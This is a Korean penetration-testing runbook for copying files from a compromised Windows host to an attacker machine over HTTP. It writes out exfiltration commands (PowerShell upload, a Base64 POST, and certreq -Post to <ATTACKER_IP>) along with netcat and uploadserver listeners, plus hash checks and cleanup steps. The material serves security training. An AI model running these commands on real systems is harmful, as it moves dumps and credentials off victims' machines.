---
tags:
  - 환경/windows
시작조건: ["Windows 대상 셸 확보", "대상에서 공격 호스트의 HTTP 수신 포트로 연결 가능"]
필요권한: ["대상 파일 읽기 권한", "공격 호스트에서 수신 파일 저장 권한"]
필요조건: ["업로드할 파일", "공격 호스트 HTTP 주소·포트", "PowerShell 또는 certreq.exe 중 하나"]
결과: ["Windows 대상에서 공격 호스트로 회수한 파일", "송신본·수신본 크기와 hash 비교 결과"]
---

# Windows HTTP 파일 회수

## 한 줄 판단

Windows 대상 셸에서 회수할 파일을 읽을 수 있고 공격 호스트의 HTTP 수신 포트에 연결할 수 있으면 PowerShell POST 또는 `certreq -Post`로 파일을 전송하고 수신본의 크기와 hash를 비교한다.

## 사용할 때

- Windows 대상에서 로그·설정·덤프 파일을 공격 호스트로 회수할 때.
- SMB·RDP drive·WinRM download를 사용할 수 없지만 HTTP outbound가 가능할 때.
- PowerShell 또는 `certreq.exe`가 대상에 있을 때.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 대상 파일 | 현재 계정으로 파일 읽기 가능 | `Get-Item`, `Get-FileHash` | 경로·ACL과 잠금 상태 확인 |
| 네트워크 방향 | Windows 대상에서 `<ATTACKER_IP>:<PORT>` 연결 가능 | 수신 서버 요청 로그 | 주소·route·proxy·방화벽 확인 |
| 수신 방식 | multipart upload 또는 raw HTTP POST 처리 가능 | 공격 호스트 listener 종류 확인 | 클라이언트와 수신 서버 형식을 맞춤 |
| 완료 기준 | 송신 파일과 수신 파일 크기·SHA-256 비교 가능 | 양쪽 hash 계산 | 수신 성공 메시지만으로 완료 판단하지 않음 |

## 실행

### PowerShell multipart 업로드

공격 호스트에서 업로드 서버를 시작한다.

```bash
test ! -e '<UPLOAD_RECEIVE_DIRECTORY>'
ss -ltnp 'sport = :<PORT>'
mkdir -m 700 '<UPLOAD_RECEIVE_DIRECTORY>'
python3 -m uploadserver --bind <ATTACKER_IP> --directory '<UPLOAD_RECEIVE_DIRECTORY>' <PORT> &
UPLOADSERVER_PID=$!
ps -p "$UPLOADSERVER_PID" -o pid,cmd
```

Windows 대상에 `PSUpload.ps1`이 있으면 함수를 불러와 파일을 전송한다.

```powershell
Import-Module .\PSUpload.ps1
Invoke-FileUpload -Uri http://<ATTACKER_IP>:<PORT>/upload -File <SOURCE_FILE>
Get-FileHash <SOURCE_FILE> -Algorithm SHA256
```

### PowerShell Base64 POST

```powershell
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('<SOURCE_FILE>'))
Invoke-WebRequest -Uri http://<ATTACKER_IP>:<PORT>/ -Method POST -Body $b64
```

공격 호스트에서는 POST body를 저장한 뒤 Base64를 decode하고 SHA-256을 계산한다.

### certreq HTTP POST

공격 호스트에서 raw HTTP 요청을 받을 listener를 시작한다.

```bash
test ! -e '<RAW_HTTP_CAPTURE>'
ss -ltnp 'sport = :<PORT>'
sudo nc -lvnp <PORT> > '<RAW_HTTP_CAPTURE>' &
RAW_HTTP_LISTENER_PID=$!
ps -p "$RAW_HTTP_LISTENER_PID" -o pid,cmd
```

Windows 대상에서 파일을 POST한다.

```cmd
certreq.exe -Post -config http://<ATTACKER_IP>:<PORT>/ <SOURCE_FILE>
```

확인할 출력:

- PowerShell 업로드 완료 메시지 또는 공격 호스트 listener의 HTTP POST와 파일 내용.
- `certreq`가 timeout을 출력하더라도 공격 호스트에 POST body가 도착했는지 별도로 확인한다.
- 송신본과 수신본의 파일 크기와 SHA-256 일치.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 수신 서버에 요청과 파일이 저장되고 hash 일치 | HTTP 파일 회수 완료 | 대상 파일 회수 | 필요한 분석 후 수신 파일 보관 여부 결정 |
| `certreq` timeout이지만 listener에 완전한 body 도착 | 서버 응답은 없지만 업로드는 완료될 수 있음 | 전송 결과 확인 필요 | Content-Length와 수신본 hash 확인 |
| 요청은 도착했지만 hash 불일치 | Base64 decode·multipart 처리 또는 중단 전송 문제 | 손상된 회수 파일 | 수신 방식과 decode 과정을 수정해 재전송 |
| TCP 연결이 없음 | 주소·port·route·proxy 문제 | 업로드 경로 미확보 | 대상에서 공격 호스트까지의 연결 확인 |
| 파일 읽기 거부 | 현재 계정에 source 파일 권한 없음 | 업로드 시작 전 실패 | 파일 ACL·잠금·현재 token 확인 |

## 확인할 출력과 권한

- 파일 읽기, HTTP 연결, 요청 수신, 파일 저장과 hash 일치를 각각 확인한다.
- 대상 파일 회수는 파일 내용에 포함된 계정·hash·ticket의 유효성이나 권한을 입증하지 않는다.

## 변경 영향과 복구

Windows 대상의 `<SOURCE_FILE>`은 읽기만 하므로 이 문서의 복구 대상이 아니다. 공격 호스트에 새로 만든 listener·수신 디렉터리·raw capture와 선택적으로 decode한 파일만 정리한다.

| 생성 항목 | 기존 상태·식별값 | 정리 순서와 명령 | 완료 확인 |
|---|---|---|---|
| uploadserver listener | 실행 전 `ss -ltnp 'sport = :<PORT>'`, `<UPLOADSERVER_PID>`와 command line | Windows 전송 종료와 hash 비교 뒤 `kill <UPLOADSERVER_PID>` | `ps -p <UPLOADSERVER_PID>`에 process가 없고 해당 포트를 이번 PID가 듣지 않음 |
| 전용 수신 디렉터리와 업로드 파일 | 기존에 없던 `<UPLOAD_RECEIVE_DIRECTORY>`, 업로드 뒤 생긴 exact 파일명·크기·SHA-256 | 결과 인계 뒤 확인한 수신 파일만 `rm -- '<UPLOAD_RECEIVE_DIRECTORY>/<RECEIVED_FILE>'`, 빈 디렉터리는 `rmdir '<UPLOAD_RECEIVE_DIRECTORY>'` | `test ! -e '<UPLOAD_RECEIVE_DIRECTORY>'` 성공 |
| raw HTTP listener와 capture | 실행 전 포트 상태, `<RAW_HTTP_LISTENER_PID>`와 기존에 없던 `<RAW_HTTP_CAPTURE>` | 요청이 끝난 뒤 process가 남아 있으면 `kill <RAW_HTTP_LISTENER_PID>`; 결과 인계 뒤 `rm -- '<RAW_HTTP_CAPTURE>'` | 기록한 PID와 exact capture 경로가 없음 |
| Base64 decode 결과 | 기존에 없던 `<DECODED_RECEIVED_FILE>`과 원본·decode 결과 hash | 결과 인계 뒤 `rm -- '<DECODED_RECEIVED_FILE>'` | `test ! -e '<DECODED_RECEIVED_FILE>'` 성공 |

정리는 Windows 전송 process 종료 확인 → 공격 호스트 listener 종료 → 수신본 검증·인계 → exact 로컬 파일 제거 순서로 수행한다. listener 종료가 실패하면 PID와 command line을 다시 대조하며 모든 Python·netcat process를 이름으로 종료하지 않는다. 전송이 중단됐거나 `certreq`가 timeout이면 Content-Length·수신 크기·SHA-256을 확인하기 전에는 회수나 복구 완료로 판정하지 않는다.

## 관련 도구

- [[powershell]]
- [[netcat]]

## 관련 상태 라우터

- [[상황별 파일 전송]]

## 참고 링크

- [uploadserver](https://github.com/Densaugeo/uploadserver)
